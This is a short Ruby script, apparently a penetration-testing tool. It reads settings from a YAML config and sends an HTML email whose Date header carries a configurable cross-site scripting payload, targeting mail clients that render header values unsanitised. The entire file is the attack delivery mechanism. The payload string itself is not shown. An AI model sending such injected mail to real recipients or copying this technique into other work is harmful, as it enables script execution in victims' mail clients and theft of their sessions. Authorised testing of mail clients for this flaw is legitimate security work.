#!/usr/bin/env ruby

require 'net/smtp'
require 'yaml'

config = YAML.load_file('config.yml')['xss']

from_addr = config['from_addr']
to_addr   = config['to_addr']
smtp_srv  = config['smtp_srv']
smtp_port = config['smtp_port']

from_name = config['from_name']
to_name   = config['to_name']
subject   = config['subject']
body      = config['body']

payload   = config['payload']

msgstr = <<EOM
From: #{from_name} <#{from_addr}>
To: #{to_name} <#{to_addr}>
Subject: #{subject}
Date: #{payload}
Content-type: text/html

#{body}
EOM

Net::SMTP.start(smtp_srv, smtp_port) do |smtp|
  smtp.send_message msgstr, from_addr, to_addr
end
